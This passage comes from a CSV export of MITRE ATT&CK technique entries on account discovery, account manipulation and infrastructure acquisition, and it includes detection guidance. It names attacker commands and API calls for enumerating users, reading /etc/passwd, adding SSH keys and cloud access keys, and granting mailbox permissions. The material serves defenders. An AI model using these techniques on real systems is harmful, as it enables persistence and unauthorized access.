","Linux, Windows, macOS","Command: Command Execution, Group: Group Enumeration, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation",True,T1087,,"ExtraHop; Miriam Wiesner, @miriamxyra, Microsoft Security",,,,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Microsoft Net),(Citation: ESET Lazarus Jun 2020),(Citation: Symantec Buckeye),(Citation: NCC Group Chimera January 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Trend Micro Muddy Water March 2021),(Citation: NCC Group Team9 June 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: GitHub PoshC2),(Citation: CISA SoreFang July 2016),(Citation: Trend Micro Black Basta October 2022),(Citation: AlienVault Sykipot 2011),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: FoxIT Wocao December 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Cycraft Chimera April 2020),(Citation: Symantec Bumblebee June 2022),(Citation: FireEye FIN6 Apr 2019),(Citation: McAfee Bankshot),(Citation: Mandiant FIN12 Oct 2021),(Citation: CME Github September 2018),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Cybereason Bumblebee August 2022),(Citation: IBM IcedID November 2017),(Citation: Cyberreason Anchor December 2019),(Citation: Microsoft BlackCat Jun 2022),(Citation: Kaspersky Poseidon Group),(Citation: Palo Alto OilRig May 2016),(Citation: DFIR Ryuk's Return October 2020),(Citation: SecureWorks August 2019),(Citation: TechNet Dsquery),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Cybereason Valak May 2020),(Citation: CrowdStrike BloodHound April 2018),(Citation: Mandiant APT41),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: US-CERT TA18-074A),(Citation: Github PowerShell Empire),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Secureworks IRON RITUAL Profile),(Citation: ESET Telebots Dec 2016),(Citation: ESET ComRAT May 2020),(Citation: FireEye FIN6 April 2016),(Citation: NCC Group LAPSUS Apr 2022),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Mandiant FIN13 Aug 2022),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023),(Citation: UCF STIG Elevation Account Enumeration)"
T1087.003,attack-pattern--4bc31b94-045b-4752-8920-aebaebdb6470,Account Discovery: Email Account,"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)

In on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)

In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)",https://attack.mitre.org/techniques/T1087/003,21 February 2020,31 March 2021,enterprise-attack,1.1,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","Google Workspace, Office 365, Windows","Command: Command Execution, Process: Process Creation",True,T1087,,,User,,,,,"(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: ESET Telebots July 2017),(Citation: Black Hills Attacking Exchange MailSniper, 2016),(Citation: CIS Emotet Dec 2018),(Citation: SensePost Ruler GitHub),(Citation: BiZone Lizar May 2021),(Citation: IBM IcedID November 2017),(Citation: Trend Micro TA505 June 2019),(Citation: Trend Micro Trickbot Nov 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ESET Grandoreiro April 2020),(Citation: Symantec Dragonfly),(Citation: MSTIC Nobelium Toolset May 2021),"
T1087.001,attack-pattern--25659dd6-ea12-45c4-97e6-381e3e4b593e,Account Discovery: Local Account,"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.

Commands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts.",https://attack.mitre.org/techniques/T1087/001,21 February 2020,13 April 2023,enterprise-attack,1.4,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

Monitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)","Linux, Windows, macOS","Command: Command Execution, File: File Access, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation",True,T1087,,"Daniel Stepanic, Elastic; Miriam Wiesner, @miriamxyra, Microsoft Security",,,,,,"(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Savill 1999),(Citation: Unit 42 Kazuar May 2017),(Citation: Symantec Orangeworm April 2018),(Citation: FireEye Periscope March 2018),(Citation: Lotus Blossom Jun 2015),(Citation: Symantec Buckeye),(Citation: F-Secure The Dukes),(Citation: NCC Group Chimera January 2021),(Citation: GitHub PowerSploit May 2012),(Citation: Mandiant APT1),(Citation: Morphisec ShellTea June 2019),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: CISA SoreFang July 2016),(Citation: GitHub PoshC2),(Citation: Crowdstrike Indrik November 2018),(Citation: RATANKBA),(Citation: Kaspersky Turla Aug 2014),(Citation: Accenture HyperStack October 2020),(Citation: McAfee Bankshot),(Citation: ESET InvisiMole June 2018),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: PowerSploit Documentation),(Citation: Malwarebytes Pony April 2016),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Palo Alto Comnie),(Citation: ANSSI Sandworm January 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: Kaspersky Poseidon Group),(Citation: Palo Alto OilRig May 2016),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: ESET Crutch December 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: CrowdStrike BloodHound April 2018),(Citation: Cybereason Valak May 2020),(Citation: FireEye admin@338),(Citation: Cylance Dust Storm),(Citation: Github PowerShell Empire),(Citation: S2 Grupo TrickBot June 2017),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET ComRAT May 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: GitHub Pupy),(Citation: Symantec W32.Duqu),(Citation: NCC Group Team9 June 2020),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: UCF STIG Elevation Account Enumeration)"
T1098.001,attack-pattern--8a2f40cf-8325-47f9-96e4-b1ca4c7389bd,Account Manipulation: Additional Cloud Credentials,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.

For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals)

In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)

Adversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation: Sysdig ScarletEel 2.0) For example, in Azure AD environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) 

In AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials tied to the permissions of the original user account. These credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.
(Citation: Crowdstrike AWS User Federation Persistence)",https://attack.mitre.org/techniques/T1098/001,19 January 2020,03 October 2023,enterprise-attack,2.6,"Persistence, Privilege Escalation","Monitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.

Monitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.","Azure AD, IaaS, SaaS",User Account: User Account Modification,True,T1098,,"Alex Soler, AttackIQ; Arad Inbar, Fidelis Security; Dylan Silva, AWS Security; Expel; Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Oleg Kolesnikov, Securonix; Zur Ulianitzky, XM Cyber",,,,,,"(Citation: GitHub Pacu),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: Crowdstrike AWS User Federation Persistence),(Citation: Expel IO Evil in AWS)"
T1098.003,attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3,Account Manipulation: Additional Cloud Roles,"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)
(Citation: Microsoft O365 Admin Roles) 

This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.

For example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)",https://attack.mitre.org/techniques/T1098/003,19 January 2020,03 October 2023,enterprise-attack,2.3,"Persistence, Privilege Escalation",Collect activity logs from IAM services and cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. ,"Azure AD, Google Workspace, IaaS, Office 365, SaaS",User Account: User Account Modification,True,T1098,,"Alex Parsons, Crowdstrike; Alex Soler, AttackIQ; Arad Inbar, Fidelis Security; Chris Romano, Crowdstrike; Clément Notin, Tenable; Microsoft Threat Intelligence Center (MSTIC); Pià Consigny, Tenable; Praetorian; Wojciech Lesicki",,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft Requests for Azure AD Roles in Privileged Identity Management)"
T1098.006,attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64,Account Manipulation: Additional Container Cluster Roles,"An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)
 
This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  

Note that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",https://attack.mitre.org/techniques/T1098/006,14 July 2023,16 October 2023,enterprise-attack,1.0,"Persistence, Privilege Escalation",,Containers,User Account: User Account Modification,True,T1098,,,,,,,,","
T1098.002,attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306,Account Manipulation: Additional Email Delegate Permissions,"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. 

For example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) 

Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452)

This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)",https://attack.mitre.org/techniques/T1098/002,19 January 2020,03 October 2023,enterprise-attack,2.1,"Persistence, Privilege Escalation","Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.

Enable the UpdateFolderPermissions action for all logon types. The mailbox audit log will forward folder permission modification events to the Unified Audit Log. Create rules to alert on ModifyFolderPermissions operations where the Anonymous or Default user is assigned permissions other than None. 

A larger than normal volume of emails sent from an account and similar phishing emails sent from  real accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.","Google Workspace, Office 365, Windows","Application Log: Application Log Content, Group: Group Modification, User Account: User Account Modification",True,T1098,,"Arad Inbar, Fidelis Security; Jannie Li, Microsoft Threat Intelligence Center (MSTIC); Microsoft Detection and Response Team (DART); Mike Burns, Mandiant; Naveen Vijayaraghavan, Nilesh Dherange (Gurucul)",,,,,,"(Citation: FireEye APT35 2018),(Citation: Volexity SolarWinds),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: MSTIC Nobelium Oct 2021),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: Gmail Delegation)"
T1098.005,attack-pattern--7decb26c-715c-40cf-b7e0-026f7d7cc215,Account Manipulation: Device Registration,"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.

MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds) In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account. (Citation: Mandiant APT29 Microsoft 365 2022)

Similarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: Microsoft DEV-0537) 

Devices registered in Azure AD may be able to conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.(Citation: Microsoft - Device Registration) Additionally, an adversary may be able to perform a [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) on an Azure AD tenant by registering a large number of devices.(Citation: AADInternals - BPRT)",https://attack.mitre.org/techniques/T1098/005,04 March 2022,03 October 2023,enterprise-attack,1.2,"Persistence, Privilege Escalation",,"Azure AD, SaaS, Windows","Active Directory: Active Directory Object Creation, Application Log: Application Log Content, User Account: User Account Modification",True,T1098,,"Arad Inbar, Fidelis Security; Joe Gumke, U.S. Bank; Mike Moran; Pawel Partyka, Microsoft 365 Defender",,,,,,"(Citation: Volexity SolarWinds),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: AADInternals Documentation),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: CISA MFA PrintNightmare),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Microsoft - Device Registration)"
T1098.004,attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4,Account Manipulation: SSH Authorized Keys,"Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value “yes” to ensure public key and RSA authentication are enabled. The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.

Adversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.

Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. 

SSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)",https://attack.mitre.org/techniques/T1098/004,24 June 2020,03 October 2023,enterprise-attack,1.3,"Persistence, Privilege Escalation","Use file integrity monitoring to detect changes made to the <code>authorized_keys</code> file for each user on a system. Monitor for suspicious processes modifying the <code>authorized_keys</code> file. In cloud environments, monitor instances for modification of metadata and configurations.

Monitor for changes to and suspicious processes modifiying <code>/etc/ssh/sshd_config</code>.

For network infrastructure devices, collect AAA logging to monitor for rogue SSH keys being added to accounts.","IaaS, Linux, Network, macOS","Command: Command Execution, File: File Modification, Process: Process Creation",True,T1098,,"Arad Inbar, Fidelis Security; Austin Clark, @c2defense; Dror Alon, Palo Alto Networks; Or Kliger, Palo Alto Networks; Tony Lambert, Red Canary",,,,,,"(Citation: trendmicro xcsset xcode project 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Cisco Talos Intelligence Group),(Citation: Trend Micro Skidmap),(Citation: Aqua TeamTNT August 2020),"
T1583.005,attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074,Acquire Infrastructure: Botnet,"Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)",https://attack.mitre.org/techniques/T1583/005,01 October 2020,15 April 2021,enterprise-attack,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during [Phishing](https://attack.mitre.org/techniques/T1566), [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499), or [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",PRE,,True,T1583,,,,,,,,","
T1583.002,attack-pattern--197ef1b9-e764-46c3-b96c-23f77985dc81,Acquire Infrastructure: DNS Server,"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.

By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)",https://attack.mitre.org/techniques/T1583/002,01 October 2020,15 April 2021,enterprise-attack,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,,True,T1583,,,,,,,,"(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Novetta-Axiom),"
T1583.001,attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3,Acquire Infrastructure: Domains,"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.

Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute ""IDN homograph attacks,"" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)

Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)

Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)",https://attack.mitre.org/techniques/T1583/001,30 September 2020,30 March 2023,enterprise-attack,1.2,Resource Development,"Domain registration information is, by design, captured in public registration logs. Consider use of services that may aid in tracking of newly acquired domains, such as WHOIS databases and/or passive DNS. In some cases it may be possible to pivot on known pieces of domain registration information to uncover other infrastructure purchased by the adversary. Consider monitoring for domains created with a similar structure to your own, including under a different TLD. Though various tools and services exist to track, query, and monitor domain name registration information, tracking across multiple DNS infrastructures can require multiple tools/services or more advanced analytics.(Citation: ThreatConnect Infrastructure Dec 2020)

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control.",PRE,"Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS",True,T1583,,"Deloitte Threat Library Team; Menachem Goldstein; Oleg Kolesnikov, Securonix; Vinayak Wadhwa, Lucideus; Wes Hurd",,,,,,"(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Microsoft Actinium February 2022),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: ESET Lazarus Jun 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Kaspersky Winnti April 2013),(Citation: Mandiant APT1),(Citation: Secureworks COBALT DICKENS August 2018),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Talos Transparent Tribe May 2021),(Citation: Proofpoint TA2541 February 2022),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: FireEye APT28),(Citation: Cybereason Kimsuky November 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Certfa Charming Kitten January 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Accenture MUDCARP March 2019),(Citation: DOJ APT10 Dec 2018),(Citation: Proofpoint TA407 September 2019),(Citation: Cisco Operation Layover September 2021),(Citation: Phish Labs Silent Librarian),(Citation: SecureWorks August 2019),(Citation: Dragos Hexane),(Citation: TrendMicro EarthLusca 2022),(Citation: ThreatConnect Kimsuky September 2020),(Citation: Palo Alto Black-T October 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: McAfee Honeybee),(Citation: CISA AA20-301A Kimsuky),(Citation: KISA Operation Muzabi),(Citation: ESET Dukes October 2019),(Citation: Cylance Dust Storm),(Citation: Secureworks COBALT DICKENS September 2019),(Citation: Malwarebytes Silent Librarian October 2020),(Citation: DOJ Iran Indictments March 2018),(Citation: Recorded Future REDDELTA July 2020),(Citation: Zdnet Kimsuky Group September 2020),(Citation: McAfee Dianxun March 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: Korean FSI TA505 2020),(Citation: ESET Operation Spalax Jan 2021),(Citation: Microsoft Targeting Elections September 2020),(Citation: Lunghi Iron Tiger Linux),(Citation: FireEye APT29 Nov 2018),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Volexity Ocean Lotus November 2020),(Citation: Google TAG Lazarus Jan 2021),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Unit 42 Gamaredon February 2022),(Citation: Malwarebytes Kimsuky June 2021),(Citation: eSentire FIN7 July 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),"
T1583.008,attack-pattern--155207c0-7f53-4f13-a06b-0a9907ef5096,Acquire Infrastructure: Malvertising,"Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. 

Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary’s efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) 

